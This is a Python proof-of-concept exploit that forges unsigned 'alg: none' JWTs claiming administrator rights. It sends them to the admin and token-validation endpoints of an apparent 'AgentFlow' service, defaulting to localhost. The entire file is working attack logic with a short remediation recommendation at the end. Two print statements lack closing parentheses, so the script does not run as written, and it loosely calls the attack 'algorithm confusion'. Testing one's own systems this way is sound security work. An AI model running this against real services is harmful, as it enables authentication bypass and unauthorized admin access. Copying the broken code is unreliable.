#!/usr/bin/env python3
"""
Proof of Concept: JWT Algorithm Confusion Attack
Demonstrates critical vulnerability in JWT authentication

This attack exploits missing algorithm validation to bypass authentication
and gain administrative access to the system.

CVE Potential: Similar to CVE-2023-30833 but for AgentFlow implementation
"""

import json
import base64
import requests
from typing import Dict, Any, Optional

class JWTAlgorithmConfusionExploit:
    """
    Exploits JWT algorithm confusion vulnerability to bypass authentication.

    This attack works by:
    1. Creating a JWT with 'alg: none' header
    2. Setting malicious payload with elevated privileges
    3. Sending token to authentication endpoint
    4. Gaining unauthorized access if validation is insufficient
    """

    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url
        self.session = requests.Session()

    def create_malicious_token(self, user_id: str = "attacker",
                             admin: bool = True,
                             expiration_hours: int = 24) -> str:
        """
        Create a malicious JWT token with algorithm confusion.

        Args:
            user_id: User ID to impersonate
            admin: Whether to grant admin privileges
            expiration_hours: Token validity period

        Returns:
            Malicious JWT token string
        """
        import time

        # Create header with algorithm confusion
        header = {
            "alg": "none",  # This is the key vulnerability
            "typ": "JWT"
        }

        # Create malicious payload
        payload = {
            "sub": user_id,
            "admin": admin,
            "role": "administrator" if admin else "user",
            "permissions": ["read", "write", "delete", "admin"] if admin else ["read"],
            "iat": int(time.time()),
            "exp": int(time.time()) + (expiration_hours * 3600),
            "jti": f"malicious_token_{int(time.time())}",
            "iss": "agentflow-auth",
            "aud": "agentflow-api"
        }

        # Base64 encode header and payload (no signature for alg: none)
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')

        # Create token without signature (algorithm confusion)
        malicious_token = f"{header_b64}.{payload_b64}."

        return malicious_token

    def test_authentication_bypass(self, token: str) -> Dict[str, Any]:
        """
        Test if the malicious token bypasses authentication.

        Args:
            token: Malicious JWT token

        Returns:
            Response data from authentication attempt
        """
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }

        try:
            # Test against a protected admin endpoint
            response = self.session.get(
                f"{self.target_url}/admin/users",
                headers=headers,
                timeout=10
            )

            return {
                "status_code": response.status_code,
                "success": response.status_code == 200,
                "response_data": response.json() if response.status_code == 200 else None,
                "headers": dict(response.headers),
                "vulnerable": response.status_code == 200
            }

        except requests.exceptions.RequestException as e:
            return {
                "error": str(e),
                "vulnerable": False
            }

    def test_token_validation(self, token: str) -> Dict[str, Any]:
        """
        Test token validation endpoint directly.

        Args:
            token: JWT token to test

        Returns:
            Validation response
        """
        payload = {
            "token": token
        }

        try:
            response = self.session.post(
                f"{self.target_url}/auth/validate",
                json=payload,
                timeout=10
            )

            return {
                "status_code": response.status_code,
                "valid": response.status_code == 200,
                "response_data": response.json() if response.status_code == 200 else None,
                "vulnerable": response.status_code == 200
            }

        except requests.exceptions.RequestException as e:
            return {
                "error": str(e),
                "vulnerable": False
            }

    def run_exploit(self) -> Dict[str, Any]:
        """
        Execute the complete algorithm confusion exploit.

        Returns:
            Complete exploit results
        """
        print("🔴 JWT Algorithm Confusion Attack - Proof of Concept")
        print("=" * 60)

        # Create malicious token
        print("1. Creating malicious JWT token with alg: none...")
        malicious_token = self.create_malicious_token()
        print(f"   Token: {malicious_token[:50]}...")

        # Test authentication bypass
        print("\n2. Testing authentication bypass...")
        auth_result = self.test_authentication_bypass(malicious_token)

        if auth_result.get("vulnerable"):
            print("   ❌ VULNERABILITY CONFIRMED!")
            print(f"   Status: {auth_result['status_code']}")
            print("   Admin access granted with malicious token"
        else:
            print("   ✅ Attack blocked")
            print(f"   Status: {auth_result['status_code']}")

        # Test token validation
        print("\n3. Testing token validation...")
        validation_result = self.test_token_validation(malicious_token)

        if validation_result.get("vulnerable"):
            print("   ❌ VULNERABILITY CONFIRMED!")
            print("   Malicious token accepted as valid"
        else:
            print("   ✅ Token validation working")
            print(f"   Status: {validation_result['status_code']}")

        # Return complete results
        return {
            "exploit_name": "JWT Algorithm Confusion",
            "target": self.target_url,
            "malicious_token": malicious_token,
            "auth_bypass_result": auth_result,
            "validation_result": validation_result,
            "overall_vulnerable": auth_result.get("vulnerable") or validation_result.get("vulnerable"),
            "severity": "CRITICAL" if auth_result.get("vulnerable") else "LOW",
            "recommendation": "Implement strict JWT algorithm validation and reject alg: none"
        }

def main():
    """Main execution function."""
    print("JWT Algorithm Confusion Attack PoC")
    print("This demonstrates a critical authentication bypass vulnerability")
    print()

    # Initialize exploit
    exploit = JWTAlgorithmConfusionExploit()

    # Run the exploit
    results = exploit.run_exploit()

    # Print summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Target: {results['target']}")
    print(f"Vulnerable: {results['overall_vulnerable']}")
    print(f"Severity: {results['severity']}")
    print(f"Recommendation: {results['recommendation']}")

    if results['overall_vulnerable']:
        print("\n🚨 CRITICAL: System is vulnerable to authentication bypass!")
        print("   Immediate remediation required before production deployment.")

if __name__ == "__main__":
    main()